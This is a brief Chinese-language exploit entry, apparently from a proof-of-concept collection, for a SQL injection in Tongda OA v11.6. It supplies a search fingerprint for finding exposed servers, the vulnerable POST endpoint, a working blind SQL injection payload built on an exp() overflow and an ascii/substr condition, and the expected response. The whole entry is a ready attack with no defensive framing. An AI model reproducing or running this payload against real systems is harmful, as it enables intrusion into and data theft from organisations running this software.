# 通达OA-v116-insert-sql注入

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app="TDXK-通达OA"`
- **请求**：`POST /general/document/index.php/recv/register/insert HTTP/1.1`

**Payload**
```
title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
```
- **响应特征**：200